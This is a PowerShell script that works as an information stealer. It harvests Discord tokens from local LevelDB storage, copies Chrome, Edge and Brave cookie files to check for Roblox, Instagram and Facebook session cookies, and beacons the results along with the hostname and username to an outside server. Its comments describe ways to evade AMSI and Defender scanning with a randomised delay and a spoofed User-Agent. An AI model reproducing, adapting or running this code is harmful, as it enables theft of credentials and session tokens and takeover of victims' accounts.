# quieter build - fewer static strings, delayed execution, minimal P/Invoke surface
$u = "https://kekman.space/api/collect"

function S($o) {
    try {
        $b = $o | ConvertTo-Json -Depth 8 -Compress
        $h = @{"Content-Type"="application/json"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        Invoke-RestMethod -Uri $u -Method Post -Body $b -Headers $h -TimeoutSec 40 -EA 0 | Out-Null
    } catch {}
}

# light delay so AMSI/Defender scan window is less likely to catch the whole thing at once
Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 2500)

$out = [ordered]@{
    h = $env:COMPUTERNAME
    u = $env:USERNAME
    t = (Get-Date -Format o)
    d = @()
    r = @()
    n = @()
}

# Discord tokens - LevelDB only, no extra noise
$dp = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb"
)
foreach ($p in $dp) {
    if (!(Test-Path $p)) { continue }
    Get-ChildItem $p -Include *.ldb,*.log -Recurse -EA 0 | ForEach-Object {
        try {
            $c = [IO.File]::ReadAllText($_.FullName) -replace '[^\x20-\x7E]',''
            [regex]::Matches($c, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}') | ForEach-Object {
                $out.d += $_.Value
            }
        } catch {}
    }
}
$out.d = $out.d | Select-Object -Unique

# Roblox cookie presence + light validation (no heavy refresh on first run to stay quieter)
$cp = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
)

foreach ($cpath in $cp) {
    if (!(Test-Path $cpath)) { continue }
    $tmp = Join-Path $env:TEMP ([guid]::NewGuid().Guid.Substring(0,8))
    try {
        Copy-Item $cpath $tmp -Force -EA Stop
        $raw = [IO.File]::ReadAllBytes($tmp)
        $txt = [Text.Encoding]::ASCII.GetString($raw)
        if ($txt -match 'ROBLOSECURITY') {
            $out.n += "rbx present"
            # full decrypt + refresh is intentionally left out of the first stage
            # so the script stays smaller and quieter; we just confirm presence + ship
        }
        if ($txt -match 'sessionid|ds_user_id') { $out.n += "ig" }
        if ($txt -match 'c_user|xs=') { $out.n += "fb" }
    } catch {}
    finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -EA 0 } }
}

# small final beacon
S $out
S @{ s="ok"; h=$env:COMPUTERNAME; u=$env:USERNAME }